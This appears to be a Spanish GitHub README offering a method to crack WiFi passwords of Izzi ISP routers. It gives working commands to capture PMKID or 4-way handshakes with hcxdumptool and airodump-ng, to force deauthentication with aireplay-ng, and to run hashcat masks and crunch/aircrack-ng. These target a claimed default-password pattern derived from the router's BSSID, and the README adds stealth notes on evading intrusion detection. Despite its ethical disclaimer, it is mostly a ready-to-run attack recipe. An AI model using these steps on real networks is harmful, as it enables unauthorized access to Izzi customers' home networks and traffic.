# 🔍 Método de Auditoría de Seguridad WiFi para Routers Izzi

![GitHub License](https://img.shields.io/github/license/rodrigo47363/izzi-wifi-audit-method?color=blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Kali-lightgrey)
![Tools](https://img.shields.io/badge/Tools-hashcat%20%7C%20hcxdumptool%20%7C%20aircrack--ng-red)
![Status](https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen)
[![GitHub Stars](https://img.shields.io/github/stars/rodrigo47363/izzi-wifi-audit-method?style=social)](https://github.com/rodrigo47363/izzi-wifi-audit-method/stargazers)

**Metodología profesional para análisis forense de patrones de seguridad en routers Izzi.** Diseñado para auditorías éticas, investigaciones forenses y entornos controlados de pruebas de penetración (Red Team / Pentesting).

<details>
<summary>📖 <b>Índice de Contenidos</b> (Haz clic para expandir)</summary>

1. [Advertencia Ética y Legal](#-advertencia-ética-y-legal)
2. [Comenzar Rápidamente](#-comenzar-rápidamente)
3. [Metodología Detallada de Auditoría](#-metodología-detallada-de-auditoría)
4. [Estructura del Proyecto](#-estructura-del-proyecto)
5. [Configuración de Entorno Optimizado](#-configuración-de-entorno-optimizado)
6. [Métricas y Estadísticas](#-métricas-y-estadísticas)
7. [Contacto y Redes Profesionales](#-contacto-y-redes-profesionales)

</details>

---

## 🗺️ Flujo de Operación (Kill Chain)

```mermaid
flowchart TD
    A["🔍 Reconocimiento Pasivo/Activo"] --> B{"Método de Captura"}
    B -- "Client-less (Moderno)" --> C["📡 Captura PMKID"]
    B -- "Tradicional" --> D["📡 Captura 4-Way Handshake"]
    C --> E["📊 Análisis BSSID/SSID"]
    D --> E
    E --> F["🎯 Extracción de Patrón Izzi"]
    F --> G{"Estrategia de Ataque"}
    G -- "GPU Optimizada" --> H["⚡ Hashcat: Máscaras On-the-fly"]
    G -- "CPU Tradicional" --> I["🗂️ Crunch: Diccionario + Aircrack-ng"]
    H --> J{"¿Clave Encontrada?"}
    I --> J
    J -- "Sí" --> K["✅ Auditoría Exitosa"]
    J -- "No" --> L["🔄 Refinamiento de Patrones"]
    L --> G
    K --> M["📝 Documentación de Hallazgos"]
````

## ⚠️ Advertencia Ética y Legal

> **IMPORTANTE**: Este repositorio documenta técnicas de auditoría de seguridad con **fines exclusivamente educativos y de investigación autorizada**.

### 🛡️ Principios Éticos

  * ✅ **Uso permitido**: Auditorías en redes propias, laboratorios controlados, CTFs, y entornos con autorización expresa por escrito (Rules of Engagement).
  * ❌ **Uso prohibido**: Acceso no autorizado a redes ajenas, actividades ilegales, violación de privacidad.
  * 📜 **Responsabilidad**: El usuario asume total responsabilidad del uso ético y legal de estas técnicas.

## 🚀 Comenzar Rápidamente

### 📋 Prerrequisitos del Sistema

```bash
# Instalación en Kali Linux / Debian
sudo apt update && sudo apt upgrade -y

# Instalación de dependencias core (Ataques PMKID, GPU Cracking y automatización)
sudo apt install -y hashcat hcxdumptool hcxtools aircrack-ng crunch python3-scapy

# Verificar instalación
hashcat --version
hcxdumptool --help
```

### 🎯 Ejemplo Rápido: Ataque Optimizado por GPU (On-the-fly)

Evita escribir diccionarios masivos en disco (I/O bottleneck) generando los candidatos directamente en la memoria de la GPU usando Hashcat.

```bash
# Si el BSSID objetivo termina en C5DC (Patrón: XXXXXX@@C5DC)
# -1 ?u?d define el charset: Mayúsculas y Números
hashcat -m 22000 hashes.hc22000 -a 3 -1 ?u?d "?1?1?1?1?1?1@@C5DC" -w 3
```

## 🧠 Metodología Detallada de Auditoría

### 1\. 📡 Fase de Reconocimiento y Captura

La metodología moderna prioriza ataques silenciosos (Client-less) para evitar alertar a sistemas IDS/WIPS mediante la inyección de paquetes de deautenticación.

#### Opción A: Captura PMKID (Silenciosa / Recomendada)

No requiere clientes conectados a la red objetivo. Extrae el PMKID del primer paquete EAPOL.

```bash
# Captura de tráfico en APs cercanos (hcxdumptool maneja el modo monitor)
# Nota: La sintaxis de hcxdumptool puede variar según la versión. Usamos -w para salida pcapng.
sudo hcxdumptool -i wlan0 -w capturas_izzi.pcapng

# Conversión al formato unificado de Hashcat (PMKID/EAPOL a hc22000)
hcxpcapngtool -o hashes.hc22000 capturas_izzi.pcapng
```

#### Opción B: Captura Handshake Tradicional (Ruidosa)

Requiere clientes legítimos conectados. Se utiliza como *fallback* si el AP tiene mitigaciones contra PMKID.

```bash
# 1. Escaneo e identificación
sudo airodump-ng wlan0mon --essid-regex "IZZI|izzi"

# 2. Captura dirigida
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura wlan0mon

# 3. Deautenticación forzada (En otra terminal)
sudo aireplay-ng -0 4 -a 00:11:22:33:44:55 -c Client:MAC wlan0mon
```

> **Nota de Seguridad (2026)**: Si el router Izzi tiene habilitado WPA3 o PMF (Protected Management Frames - 802.11w), la opción B fallará ya que los paquetes de deautenticación falsificados serán ignorados por el cliente. La Opción A (PMKID) pasiva es el estándar actual.

### 2\. 🔎 Análisis de Patrones Izzi

#### Formato Estructural Identificado

```text
┌─────────────────────────────────────────────┐
│        PATRONES DE CONTRASEÑAS IZZI         │
├─────────────────────────────────────────────┤
│ Formato Principal: XXXXXX@@XXXX             │
│ Longitud: 12 caracteres                     │
│ Caracteres: A-Z, 0-9 (sin minúsculas)       │
│ Relación BSSID: Últimos 4 chars = parte fija│
│ Ejemplo: F82DC0@@C5DC                       │
└─────────────────────────────────────────────┘
```

#### Automatización Básica de Extracción (Bash)

```bash
BSSID="00:1A:2B:3C:4D:5E"
LAST4=$(echo $BSSID | tr -d ':' | tail -c 4)
echo "[+] BSSID Target: $BSSID"
echo "[*] Patrón sugerido Hashcat: ?1?1?1?1?1?1@@${LAST4}"
```

### 3\. 🛠️ Generación de Candidatos (Máscaras vs Diccionarios)

#### Método Moderno: Máscaras Hashcat (Zero I/O Cost)

Recomendado. Genera contraseñas en tiempo real directamente en la ALU de la GPU, maximizando la tasa de hashes por segundo (H/s).

```bash
hashcat -m 22000 hashes.hc22000 -a 3 -1 ?u?d "?1?1?1?1?1?1@@C5DC"
```

#### Método Legacy: Crunch + Aircrack-ng (CPU Limitada)

Útil exclusivamente si la auditoría se realiza desde hardware portátil sin aceleración gráfica dedicada.

```bash
crunch 12 12 -t @@@@@@@@C5DC -d 2 -o dict_izzi_c5dc.txt
aircrack-ng -w dict_izzi_c5dc.txt -b 00:11:22:33:44:55 captura.cap
```

## 📂 Estructura del Proyecto

```text
izzi-wifi-audit-method/
├── 📁 docs/                        # Documentación técnica extendida
│   ├── 📄 patrones-izzi.md         # Análisis forense de patrones
│   └── 📄 optimizacion-hardware.md # Tuning de GPU y Kernel Linux
├── 📁 scripts/                     # Automatización Ofensiva
│   ├── 🛠️ scapy-bssid-sniffer.py  # Sniffer pasivo automatizado
│   ├── 🛠️ generador-dict.sh       # Script legacy para crunch
│   └── 🛠️ optimizador-hashcat.sh  # Setup de perfiles GPU
├── 📁 tools/                       # Herramientas auxiliares
│   └── 📄 pattern-extractor.py     # Extracción de regex
├── 📁 dictionaries/                # Diccionarios base
│   └── 📄 izzi-base.lst            # Base de anomalías conocidas
└── 📄 README.md                    # Este archivo
```

## 🔧 Configuración de Entorno Optimizado

### 💻 Recomendaciones de Hardware

| Componente | Recomendado (Pentester) | Notas Técnicas |
|------------|-------------------------|----------------|
| **CPU** | 8+ núcleos / 16+ hilos | Multithreading para desensamblado de paquetes |
| **RAM** | 32+ GB DDR4/DDR5 | Manejo de capturas pesadas (pcapng) en memoria |
| **GPU** | NVIDIA RTX 3080+ / AMD RX | Crítico para aceleración Hashcat (CUDA/OpenCL) |
| **Adaptador**| Alfa AWUS036ACH / ACS | Soporte nativo para *Monitor Mode* y *Packet Injection* |

### 🐧 Optimización del Kernel (Linux)

Ajuste de los buffers de red para evitar pérdida de paquetes (packet drop) durante escaneos masivos:

```bash
echo "net.core.rmem_max = 134217728" | sudo tee -a /etc/sysctl.conf
echo "net.core.wmem_max = 134217728" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

## 📊 Tabla Comparativa de Métodos de Ataque

| Método | Velocidad | Sigilo (OPSEC) | Uso de Recursos | Caso de Uso Ideal |
|--------|-----------|----------------|-----------------|-------------------|
| **PMKID + Hashcat (Mask)** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | Alto (GPU) | Entornos corporativos, evasión de WIDS |
| **Handshake + Hashcat** | ⭐⭐⭐⭐ | ⭐⭐ | Alto (GPU) | Si el AP no soporta PMKID |
| **Aircrack-ng (CPU)** | ⭐⭐ | ⭐⭐ | Moderado | Equipos SoC (Ej. Raspberry Pi) |
| **Fuerza Bruta Ciega** | ⭐ | ⭐⭐⭐ | Extremo | Desconocimiento total de patrón |

## 🤝 Contribuciones y Comunidad

¡Las contribuciones son bienvenidas\!

1.  Haz un Fork del repositorio.
2.  Crea tu rama (`git checkout -b feature/MejoraSeguridad`).
3.  Haz commit de tus cambios (`git commit -m 'Add: nuevo script de Scapy'`).
4.  Haz push a la rama (`git push origin feature/MejoraSeguridad`).
5.  Abre un Pull Request.

## 📜 Licencia

Este proyecto está bajo la **Licencia MIT** - ver el archivo [LICENSE](https://www.google.com/search?q=LICENSE) para detalles.

## 🌟 Reconocimientos

  * **Comunidad de seguridad**: Por mantener viva la cultura del Open Source (Hashcat, aircrack-ng dev teams).
  * **Entornos de pruebas**: HackTheBox, TryHackMe y laboratorios privados aislados.

-----

## 📞 Contacto y Redes Profesionales

[](https://linkedin.com/in/rodrigo-v-695728215)
[](https://github.com/rodrigo47363)
[](https://app.hackthebox.com/profile/2072477)
[](https://tryhackme.com/p/Rodrigo.47363)

**📧 Correo:** [rodrigovil@proton.me](mailto:rodrigovil@proton.me)

### 🚀 Plataformas de Entrenamiento (Referidos)

[](https://referral.hackthebox.com/mz7ZtlJ)
[](https://tryhackme.com/signup?referrer=64f0d7665fde58f3ec71379b)

## 💝 Apoya este Proyecto (HODL)

Si este repositorio te ha sido útil para optimizar tus metodologías de Red Team:

  * **Bitcoin (BTC):** `bc1qkzmpd0hry99qms7ef23vsyx9vt34pzzaslpp8y`
  * **Ethereum (ETH):** `0xB75bC57C54FCBFF139EBF981A596B019C537d018`
  * **Solana (SOL):** `ELekuGHcmZjhXrtHNqHuu8QmdCZr3oCWtTmu3QUQ5hac`

> *"La seguridad no es un producto, sino un proceso continuo. La auditoría ética nos permite identificar vulnerabilidades antes de que sean explotadas."* 🔐

**Última actualización:** Abril 2026 | **Mantenido activamente por:** Rodrigo - Especialista en Ciberseguridad Ofensiva
